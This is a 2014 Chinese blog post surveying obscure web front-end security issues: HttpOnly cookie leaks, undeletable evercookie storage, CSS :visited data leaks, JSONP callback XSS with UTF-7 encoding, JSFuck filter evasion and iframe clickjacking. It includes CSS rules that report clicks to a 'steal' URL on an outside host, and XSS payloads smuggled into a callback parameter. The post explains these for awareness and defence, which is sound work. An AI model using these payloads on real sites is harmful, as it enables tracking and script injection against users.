---
title: '前端安全冷门知识杂谈'
---

## date: 2014-05-27 23:52

### 零、概述

提起 web 前端安全，大家都会想到两个名词：`xss`和`csrf`。  
抛去这最常见，最被广泛应用的两者，我想谈谈一些难以觉察的，比较偏门的安全关注点。  
大概分为以下章节：

> 盗取无法用 js 读写的 Cookie  
> 删不掉的本地存储  
> 函数覆写监听上报  
> 内存 Cookie 与硬盘 Cookie  
> CSS 带来的点击量泄露  
> JSONP 回调函数与 UTF-7 编码  
> 过滤与代码混淆  
> 心理学与社会工程学

资料略多，文章较长，请自备瓜子…

<!-- more -->

### 一、盗取无法用 js 读写的 Cookie

为了防范 xss 获取 Cookie，网络规范提供了 HttpOnly Cookie 机制，设置了该标志后，js 脚本将无法读写该 Cookie。但既然首先是“无法读”，如何“可以读”就成为了个有趣的话题。

```
setcookie("test", 1, time()+3600, "", "", 0); // 设置普通Cookie
setcookie("test_http", 1, time()+3600, "", "", 0, 1);// 第7个参数是HttpOnly 标志，0 为关闭(默认)，1 为开启
```

我们还是可以通过一些服务器上的漏洞去获取它们。

#### 2.1) 调试信息泄露

比较经典的是 PHP 的 phpinfo 文件：  
![phpinfo文件](/assets/blogImg/safety_001.jpg)  
如果在部署服务时，没有删除这个默认的调试信息文件，将泄露服务器信息。其中包括 HttpOnly Cookie。  
访问 phpinfo.php，将看到：  
![Alt text](/assets/blogImg/safety_002.jpg)  
其他的服务器，如 python 的 Django，也有类似的调试信息文件，在外发时要注意清除。

#### 2.2) Apache 2.2.x 版本请求头超长泄露

Cookies 最大限制一般为 4kb 左右，如果请求头长度超过 LimitRequestFieldSize，将会引发 400 错误。在 Apache 2.2.x 多个版本内，如果引发 400(Bad Requerst)错误，会返回出错的请求头内容，这就包含了 HttpOnly Cookie。
因此，我们可以利用这个漏洞，构造一个超长的请求，让 Apache 返回 400，并用 ajax 捕获 xhr.responseText 即可获得 HttpOnly Cookie 信息。  
![Alt text](/assets/blogImg/safety_003.jpg)

### 三、删不掉的本地存储

如果把浏览器理解为一个器官，把恶意标志比方做寄生虫。这标志通过某种途径寄生在了浏览器，并且"永久"寄生，这想想都很可怕。这个标志，可能是植入广告的跟踪标志，或者有其他用处，总之它依附到你的浏览器就删不掉了。  
但它是如何寄生的呢？又如何做到“永久”？这就涉及到本地存储安全。我们先看下常规的本地存储方案：

> Cookie - 是最常见的方式，key-value 模式  
> UserData - IE 自己的本地存储，key-value 模式  
> localStorage - HTML5 新增的本地存储，key-value 模式  
> local Database - HTML5 新增的浏览器本地 DataBase，是 SQLite 数据库  
> Flash Cookie Flash 的本地共享对象（LSO），key-value 模式，跨浏览器

除去这些，我还收集了一些比较“偏门”的存储方案：

> Silverlight 的 IsolatedStorage - 类似 HTML5 localStorage  
> PNG Cache，将 Cookie 转换成 RGB 值描述形式，以 PNG Cache 方式强制缓存着，读入则以 HTML5 的 canvas 对象读取并还原为原来的 Cookie 值  
> HTTP Etags、Web Cache - 本质上都是利用了浏览器缓存机制：浏览器会优先从本地读取缓存的内容  
> Web History，利用的是“CSS 判断目标 URL 是否访问过”技巧，比如 a 标签访问过会显示紫色（新浏览器已 fix）  
> window.name，本质就是一个 DOM 存储，并不存在本地。

老外 Samy Kamkar 用半天开发了一个 JavaScript API：[evercookie](http://en.wikipedia.org/wiki/Evercookie)。  
该 API 利用了上面的全部存储手段，将“`永不丢失你的cookie`”贯彻到底…当 evercookie 发现用某种机制存储的 cookie 被数据将删除之后，它将利用其它机制创建的 cookie 数据来重新创建，让用户几乎不可能删除 cookie。

### 四、函数覆写监听上报

覆写函数，可以用于防范？这是网上安全论坛中有人提到的一个偏门要点。其缘由是：`搞跨站的人总习惯用alert来确认是否已成功跨站`，如果你要监控是否有人在测试你的网站 xss 的话，可以在你要监控的页面里覆写 alert 函数，记录 alert 调用情况。

```
function log(s) {
    var img = new Image();
    img.src = "http://yousite.com/log.php?caller=" + encodeURIComponent(s);
}

var _alert = alert;
window.alert = function(s) {
    log(alert.caller);
    _alert(s);
}
```

如此，就能在有人调用 alert 时，就执行上报，以供监控。好吧，这里还涉及人的心理学…  
其实函数覆写无论攻还是防，都应该是我们关注的一个点。相关文章：《[浅谈 javascript 函数劫持](http://www.xfocus.net/articles/200712/963.html)》。

### 五、内存 Cookie 与硬盘 Cookie

`内存Cookie` - 指没有设置过期时间 Expires 的 Cookie，随浏览器关闭，此 Cookie 在内存中销毁  
`硬盘Cookie` - 设置了过期事件 Expires 的 Cookie，常驻硬盘，直到过期

我们很容易得出结论：内存 Cookie 更安全。因此，某些站点会把`敏感信息放到内存Cookie`里面。这原本是没什么风险的，但恰巧会在遇到 XSS 的时候失控。试想下，XSS 攻击者可以给内存 Cookie 加一个过期时间，使其变为硬盘 Cookie，就会在未来很长一段时间内，甚至是永久控制着目标用户的账号权限。

因此，这里有两个关注点：

1. 敏感信息还是不要放 Cookie 里，即使是内存 Cookie；
2. 服务器要做 Cookie 的三个维度的校验 - 唯一性（是否验证通过）、完整性（是否被篡改了）、是否过期。

### 六、CSS 带来的点击量泄露

在我们的印象中，前端安全基本是 js 带来的问题，但 css 也会有安全隐患吗？是的。除去 IE 下的 css 中执行 js 代码问题，还有另外一个关注点。  
假如有一个开源组件，我们只看了下 js 源码，觉得没有漏洞风险，就直接拿过来使用了。况且，没有前端人员乐于去读别人的 css 的…但有某种极端的情况，css 带来了意想不到的数据泄露。  
试想这是一个`导航栏组件`，html 代码是这样的：

```
<a href="http://yousite.com/a1" id="a1">nav1</a>
<a href="http://yousite.com/a2" id="a2">nav2</a>
<a href="http://yousite.com/a3" id="a3">nav3</a>
```

你忽略掉的 css 写成这样：

```
#a1:visited {background: url(http://report.com/steal?data=a1);}
#a2:visited {background: url(http://report.com/steal?data=a2);}
#a3:visited {background: url(http://report.com/steal?data=a3);}
```

我们用到业务里，用户点击这三个导航后，a 标签的 visited 伪属性生效，就会设置 background，而背景的 url 其实是上报地址。这时候，你的业务的`点击数据量`就暴露给第三方了！  
当然，这只针对旧版本浏览器，新版本浏览器都已 fix 这个问题。可是，HTML5 的出现又让这个问题回归了…  
HTML5 提供伪类`::selection`，当指定对象区域被选择时，就会触发。其原理跟上面类似。

### 七、JSONP 回调函数与 UTF-7 编码

#### 7.1) 基本原理

在 JSONP 技术中，服务器通常会让请求方在请求参数中提供 callback 函数名，而不是由数据提供方定制，如请求方发起请求：  
`cgi-bin/get_jsonp?id=123&call_back=some_function`  
返回数据格式为：  
`some_function([{'id':123, data:'some_data'}]);`  
如果，数据提供方没有对 callback 函数名做安全过滤，就会带来 XSS 问题。  
请求：  
`cgi-bin/get_jsonp?id=123&call_back=<script>alert(1);</script>`
返回：  
`<script>alert(1);</script>([{'id':123, data:'some_data'}]);`  
所以，一般服务器都会对 call_back 参数进行过滤，但过滤的方法是否会存在漏洞呢？

#### 7.2) IE 解析 UTF-7 漏洞

比较简单的过滤方法，是过滤`<>`字符，使得无法构成 html 标签。但在 IE6\IE7 的某些版本中，存在以下漏洞：**如果发现文件前面是“+/v8”开头，就把文件当做 UTF-7 解析**（IE7 后续版本已发布补丁修复）。  
在没被修复的 IE 版本中，如果我们将上面的请求用 utf-7 编码。再在前面加上"+/v8"头：  
`cgi-bin/get_jsonp?id=123&callback=%2B%2Fv8%20%2BADw-script%2BAD4-alert(1)%2BADw-%2Fscript%2BAD4`  
这时候巧妙的躲开了`<>`过滤，而返回：  
`+/v8 +ADw-script+AD4-alert(1)+ADw-/script+AD4({‘id’=>123,data=>’some_data’});`  
这时 IE 将这个 jsonp 文件当作 utf-7 解析，依然触发 XSS。

### 八、过滤与代码混淆

过滤器如果过滤了大部分的 js 函数，如 eval、alert 之类，是否就能保证安全呢？必然不是，我们还有强大的 js 代码混淆手段，可以绕过过滤器。这里推荐一个神奇的网站：[jsfuck](http://utf-8.jp/public/jsfuck.html)。  
站名如其名，满满的恶意…它可以仅仅用 6 个字符：`[]()!+`去混淆编码 js。而且兼容性特别的完善。以下是我在最新 chrome 下的截图，将一句`alert(1)`编码成了 3009 个字符，并执行成功：  
![Alt text](/assets/blogImg/safety_004.jpg)  
所以过滤器仅仅通过适配关键函数名，是不能保证安全性的。

### 九、心理学与社会工程学

有个观点认为“一切钓鱼网站成功案例，都是一次心理学的实战演练”。在这个层面，可谓五花八门，创意百出。分享两个案例：

#### 9.1）诱导触发拖拽事件

比方说，有某已知漏洞，要用户触发拖拽事件才能触发。怎么搞定这个事情呢？  
很简单，添加一张图片：  
![Alt text](/assets/blogImg/safety_005.jpg)  
注意这是一张图片，滚动条是图片的一部分而不是真正的浏览器控件，用户自然会去下拉“滚动条”，因而触发了这个漏洞。

#### 9.2) 传说中的 QQ 空间“传染病毒”

步骤是这样的：

1. A(始作俑者)发布了一条说说：`这个网站很好玩，快来试试吧~ http://xxx.xxx`
2. A 的好友们看到了，打开了这个链接，玩了一下后，就关闭了页面
3. 好友们不知道，竟然自己的空间主动转发了这条说说（问题是自己没有点转发呀！）
4. 一传十十传百，越传越广…

但真实的情况跟 CSRF 没一点关系。玄妙在于：`好友们打开链接后干了什么事情？`  
这个网站是一个小球在跳来跳去，网站上有一句话：你能点到我吗？  
用户看到后，就很想去点击小球，看会发生什么；但点击后，就转发了说说…

有人会问，这不是 CSRF 吗？还真不是。做法却很简单：  
“有趣”的网站内嵌了一个 iframe，iframe 加载的是这条说说的原页面，然后把“转发”按钮刚好放到小球的位置上，再把这 iframe 的透明度变为 0。所以用户点击小球，其实是`点击了iframe中的转发按钮`。真是令人万万没想到。

以上。
End. 5.27 by litten.
